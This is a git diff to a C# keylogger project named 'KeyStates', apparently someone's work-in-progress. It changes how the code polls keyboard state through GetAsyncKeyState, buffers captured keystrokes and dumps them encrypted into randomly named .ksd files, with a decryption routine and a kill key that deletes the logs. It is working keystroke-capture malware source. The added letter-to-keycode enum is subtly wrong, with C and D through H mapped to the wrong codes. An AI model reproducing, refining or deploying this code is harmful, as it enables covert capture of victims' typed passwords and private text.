@@ -1,4 +1,4 @@
-/*
+﻿/*
  6-19-2024
  KeyStates W.I.P
  domer/PeripheralVisionPD2
@@ -15,6 +15,36 @@ new KeyStatesCl().OnStart(); // start program
 
 namespace KeyStates
 {
+    public enum AlphaKeys : int
+    {
+        A = 0x41,
+        B = 0x42,
+        C = 0x42,
+        D = 0x43,
+        E = 0x44,
+        F = 0x45,
+        G = 0x46,
+        H = 0x47,
+        I = 0x49,
+        J = 0x4A,
+        K = 0x4B,
+        L = 0x4C,
+        M = 0x4D,
+        N = 0x4E,
+        O = 0x4F,
+        P = 0x50,
+        Q = 0x51,
+        R = 0x52,
+        S = 0x53,
+        T = 0x54,
+        U = 0x55,
+        V = 0x56,
+        W = 0x57,
+        X = 0x58,
+        Y = 0x59,
+        Z = 0x5A
+    }
+
     public struct LogCache
     {
         public string data;
@@ -42,7 +72,6 @@ namespace KeyStates
 
     internal class KeyStatesCl
     {
-        private List<DbgMsgQueue> WaitingMsgs = new();
         private Encryption.StringEncryptionService CryTxt = new Encryption.StringEncryptionService();
 
         //private FileEncryption Encrypt = new FileEncryption(); // archaic code
@@ -68,7 +97,7 @@ namespace KeyStates
         private String TmpPath = "";
         private KeyCache StateHolder;                   // holds the state of lock keys (caps lock, num lock, scroll lock)
         private LogCache LogHolder;                     // keylogger input buffer
-
+        private List<DbgMsgQueue> WaitingMsgs = new();
         // end section //
 
         // dll imports section //
@@ -152,13 +181,21 @@ namespace KeyStates
             CryTxt.SetKey(TypKey);
             CryTxt.SetIV(TypIV);
 
-            AddMsgQ($"key: ${TypKey}");
-            AddMsgQ($"iv: ${TypIV}");
-            bool KeyPress = ShowConfirmation("[!] decrypt all files? ");
+            AddMsgQ($"key: {TypKey}");
+            AddMsgQ($"iv: {TypIV}");
+
+            bool KeyPress = ShowConfirmation("[!] decrypt all files?");
+            while (WaitingMsgs.Count > 0)
+            {
+                Thread.Sleep(10);
+            }
             if (KeyPress)
             {
+                while (WaitingMsgs.Count > 0)
+                {
+                    Thread.Sleep(10);
+                }
                 bool KeyPress2 = ShowConfirmation("[!] delete original encrypted .ksd files after decryption?");
-
                 foreach (string x in Directory.EnumerateFiles(Environment.CurrentDirectory))
                 {
                     if (Path.GetExtension(x) == ".ksd")
@@ -243,12 +280,17 @@ namespace KeyStates
                             StartDec();
                         if (i == KillKey)    // f8 to kill program and delete all files
                             DestroyLog();
+
                         if (i == ShfKey || i == 0xA0 || i == 0xA1 || i == 0x14 || i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06) // keys that are pointless to log (caps lock, shift keys, etc...)
                             break;
                         if (i == 0x08)
                         {
                             LogHolder.data = LogHolder.data.Remove(LogHolder.data.Length - 1);
                             break;
+                        }
+                        if (AlphaKeys.IsDefined(typeof(AlphaKeys), i))
+                        {
+                            key = (char)i;
                         }
                         if (LwUp == false || StateHolder.Caps == true)  // if the user is holding shift or caps lock is on, print the output character in uppercase, else print in lowercase
                         {
@@ -260,23 +302,27 @@ namespace KeyStates
                             // Console.Write(key.ToString().ToLower()); // dbg junk code
                             LogHolder.data += key.ToString().ToLower();
                         }
+                        while ((GetAsyncKeyState(i) & 0x8000) > 0)
+                        {
+                            Thread.Sleep(5);
+                        }
                         break;
                     }
-                    x++;
                 }
-                if (x >= 90000 && LogHolder.data.Length > 25)
+                if (x >= 1200 && LogHolder.data.Length > 25)
                 {
                     // Console.Clear(); // dbg junk code
                     String TmpFln = SecureRandomString(6);
-                    byte[] correctBytes = Encoding.UTF8.GetBytes(LogHolder.data.Replace("\u0001", " "));
-                    string correctString = Encoding.UTF8.GetString(correctBytes);
+                    byte[] correctBytes = Encoding.Unicode.GetBytes(LogHolder.data.Replace("\u0001", " ").Replace("◄", " [CTRL DWN] ").Replace("\u0011", "¢").Replace("¾", ".").Replace("¼", ","));
+                    string correctString = Encoding.Unicode.GetString(correctBytes);
 
                     File.WriteAllText($"{TmpPath}\\" + TmpFln + ".ksd", CryTxt.Encrypt(correctString));
                     LogHolder.data = "";
                     AddMsgQ($"dumped keylog cache to {TmpFln}.ksd", DbgMsgTypes.Default, true);
                     x = 0;
                 }
-                Thread.Sleep(75);   // delay to prevent repeating characters //
+                x++;
+                Thread.Sleep(25);   // delay to prevent repeating characters //
             }
         }
 
@@ -476,19 +522,24 @@ namespace KeyStates
             }
         }
 
-        private static bool ShowConfirmation(string message, bool error = false)
+        private bool ShowConfirmation(string message, bool error = false)
         {
             System.ConsoleColor OrgColor = Console.ForegroundColor;
+
+            while (WaitingMsgs.Count > 0)
+            {
+                Thread.Sleep(10);
+            }
             Console.ForegroundColor = ConsoleColor.DarkYellow;
             if (error)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
             }
-
             Console.Write($"{message} [Y/N]: ");
             Console.ForegroundColor = OrgColor;
-            char response = (char)Console.Read();
-            return response == 'Y' || response == 'y';
+            String response = Console.ReadLine();
+
+            return response == "Y" || response == "y";
         }
 
         public void OnStart()
